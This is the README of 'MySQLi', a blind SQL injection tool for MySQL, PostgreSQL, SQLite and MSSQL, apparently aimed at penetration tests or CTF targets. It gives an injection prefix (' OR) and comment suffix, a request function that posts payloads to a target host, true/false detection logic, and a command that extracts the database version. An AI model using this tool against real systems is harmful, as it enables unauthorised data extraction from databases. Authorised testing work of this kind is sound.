# MySQLi
**Time** and **Boolean** based SQLi for **MySQL**,  **PostgreSQL**, **SQLite** and **MSSQL**  

![screenshot](https://github.com/physics-sp/MySQLi/blob/main/demo.png?raw=true)

## Features
- It allows you to have more control over the attack. You can handle logouts, CSRF tokens, and other tricky scenarios in which [sqlmap](https://github.com/sqlmapproject/sqlmap) doesn't work.
- It uses Binary search to increase speed
- Supports multiple types of databases _(MSSQL only supports Boolean based)_

## Usage
You can set strings that go before and after the query and the sleep time if Time based if being used
```python
PRE = "' OR"
POST = '--'
sleep_time = 2
```
Re-define the `send_req` function.
```python
def send_req(payload):
    #print(payload)
    params = {}
    cookies = {}
    headers = {}
    data = {'pwn': payload}
    proxies = {}
    # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    url = 'http://10.10.10.10/index.php'
    r = requests.post(
        url,
        params=params,
        data=data,
        headers=headers,
        verify=False,
        proxies=proxies,
        allow_redirects=False,
        cookies=cookies
    )
    return r
```
Optionally, you might want to re-define the `check_if_true` function to customize the detection of "true" and "false" queries.  
The _compare_value_ variable is the minimum response time of "true" queries in Time based and the Content-Length of "true" queries if Boolean based.
```python
def check_if_true(r, time_elapsed):
    if sqlitype == SQLiType.Time:
        return time_elapsed >= compare_value
    else:
        return int(r.headers['Content-Length']) == compare_value
```

Finally, run it specifying the database type, the SQL injection type and the query.
```bash
./MySQLi.py --database mysql --type boolean --query "select version() as leak"
```

## TODO
- Add Time based to MSSQL
- Add more DBs
- Add threads
